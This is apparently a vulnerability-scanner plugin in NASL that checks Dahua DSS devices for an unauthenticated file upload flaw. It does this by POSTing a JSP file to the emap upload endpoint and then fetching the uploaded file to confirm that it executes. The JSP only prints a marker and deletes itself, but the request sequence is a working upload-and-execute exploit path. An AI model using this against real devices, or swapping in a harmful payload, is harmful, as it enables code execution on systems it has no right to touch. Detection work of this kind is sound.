############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY  /opt/nessus/bin/nasl -k time172.18.253.11.kb -Xt 181.168.182.5 dahua_6-nessus.nasl
############################################################
include("compat.inc");
SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.091905300166681";

if (description)
{
  script_id(51799128);
  script_version("1.3");
  script_name(english:"Dahua DSS device Unauthenticated File Upload");
  script_summary(english:"Dahua DSS device Unauthenticated File Upload");
  script_set_attribute(attribute:"description", value:"Dahua DSS device Unauthenticated File Upload");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"vuln_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"patch_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/10/22");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Camera");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www", 80);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


file_name="bing0.jsp";
file_content= '<%\nout.println("Dahua_DSS_device_Unauthenticated_File_Upload");\nnew java.io.File(application.getRealPath(request.getServletPath())).delete();\n%>';
boundary = "--------" + rand_str(length:12, charset:"0123456789abcdef");
content_type = "multipart/form-data; boundary=" + boundary;

data = '--' + boundary + '\r\n';
data += 'Content-Disposition: form-data; name="upload"; filename="' + file_name +'"\r\n';
data += 'Content-Type: application/octet-stream\r\n\r\n';
data += file_content + '\r\n';
data += '--' + boundary + '--\r\n';


function check_vuln(port){
	url = string('/emap/bitmap/bitMap_uploadPic.action');
	req = http_send_recv3(method: "POST", port: port, item: url, data: data, content_type: content_type, fetch404: TRUE);
	res = http_last_sent_request();
	if('No result defined for action' >!< req[2]) exit(0);
	files = eregmatch(pattern: ".*result (\d+\.jsp)", string: req[2], icase: 0);
	url_visit = "/upload/emap/"+files[1];
	req_find = http_send_recv3(method: "GET", port: port, item: url_visit);
	if("200 O">< req_find[0] && "Dahua_DSS_device_Unauthenticated_File_Upload" >< req_find[2]){
	if (report_verbosity > 0) security_hole(port:port, extra:res+req_find[2]);
	    else security_hole(port);
    }
}

function check_vuln_ssl(port){
	url = string('/emap/bitmap/bitMap_uploadPic.action');
	res = http_send_recv3(method: "POST", port: port, item: url, data: data, content_type: content_type, fetch404: TRUE);
	req = http_last_sent_request();
	ssl_req = https_req_get(port:port , request:req);
	if( "No result defined for action" >!< ssl_req) exit(0);
	files = eregmatch(pattern: ".*result (\d+\.jsp)", string: ssl_req, icase: 0);
	url_visit = "/upload/emap/"+files[1];
	reqs = http_get(item:url_visit, port:port);
    ssl_reqs = https_req_get(request:reqs, port:port);
	if("200 O"><ssl_reqs && "Dahua_DSS_device_Unauthenticated_File_Upload" >< ssl_reqs){
	if (report_verbosity > 0) security_hole(port:port, extra:req+ssl_reqs);
	    else security_hole(port);
	    }
}


##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
